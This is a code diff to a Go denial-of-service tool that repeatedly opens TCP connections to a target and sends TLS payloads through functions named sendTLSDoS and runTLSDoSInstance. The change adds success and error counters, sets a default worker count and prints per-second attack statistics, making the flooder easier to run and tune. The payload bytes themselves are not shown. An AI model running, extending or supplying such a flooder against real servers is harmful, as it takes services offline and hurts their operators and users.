@@ -8,7 +8,12 @@ import (
 	"log"
 	"net"
 	"os"
+	"sync/atomic"
+	"time"
 )
+
+var successes uint64
+var errors uint64
 
 var options struct {
 	verbose bool
@@ -17,7 +22,7 @@ var options struct {
 
 func init() {
 	flag.BoolVar(&options.verbose, "v", false, "Verbose output")
-	flag.IntVar(&options.workers, "workers", 0, "Number of additional worker go routines")
+	flag.IntVar(&options.workers, "workers", 1, "Number of worker go routines")
 }
 
 func sendTLSDoS(c *net.TCPConn) (bool, error) {
@@ -75,12 +80,18 @@ func runTLSDoSInstance(addr *net.TCPAddr) {
 	//We can discard any data since we reset the connection
 	c.SetLinger(0)
 	for {
-		_, err := sendTLSDoS(c)
+		ok, err := sendTLSDoS(c)
 		if err != nil {
+			atomic.AddUint64(&errors, 1)
 			if options.verbose {
 				log.Println(err)
 			}
 			return
+		}
+		if ok {
+			atomic.AddUint64(&successes, 1)
+		} else {
+			atomic.AddUint64(&errors, 1)
 		}
 	}
 }
@@ -109,7 +120,11 @@ func main() {
 			}
 		}()
 	}
+	tckr := time.NewTicker(1 * time.Second)
 	for {
-		runTLSDoSInstance(addr)
+		select {
+			case <- tckr.C:
+				fmt.Printf("Successes: %d | Errors: %d\n", atomic.SwapUint64(&successes, 0), atomic.SwapUint64(&errors, 0))
+		}
 	}
 }
